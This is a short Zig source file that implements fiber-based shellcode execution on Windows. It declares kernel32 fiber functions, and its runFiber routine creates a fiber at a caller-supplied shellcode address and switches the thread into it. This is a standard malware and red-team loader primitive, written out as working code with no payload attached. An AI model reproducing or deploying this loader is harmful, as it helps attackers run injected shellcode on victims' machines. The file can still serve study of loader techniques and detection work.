const std = @import("std");
const windows = std.os.windows;

const FiberFunc = fn (lpFiberParameter: *anyopaque) void;

extern "kernel32" fn ConvertThreadToFiber(lpParameter: ?*anyopaque) ?*anyopaque;
extern "kernel32" fn CreateFiber(dwStackSize: usize, lpStartAddress: ?*anyopaque, lpParameter: ?*anyopaque) ?*anyopaque;
extern "kernel32" fn SwitchToFiber(lpFiber: *anyopaque) void;
extern "kernel32" fn DeleteFiber(lpFiber: *anyopaque) void;

pub fn runFiber(pAddress: *anyopaque, verbose: bool) !void {
    var PrimaryFiberAddress: ?*anyopaque = null;
    var ShellcodeFiberAddress: ?*anyopaque = null;

    ShellcodeFiberAddress = CreateFiber(0x00, pAddress, null);

    if (ShellcodeFiberAddress == null) {
        std.debug.print("[!] CreateFiber Failed With Error: \n", .{});
        return;
    }

    if (verbose) {
        std.debug.print("Shellcode Fiber Addresss: {*} \n", .{ShellcodeFiberAddress});
    }

    PrimaryFiberAddress = ConvertThreadToFiber(null);

    if (verbose) {
        std.debug.print("Primary Fiber Addresss: {*} \n", .{PrimaryFiberAddress});
    }

    SwitchToFiber(ShellcodeFiberAddress.?);
}
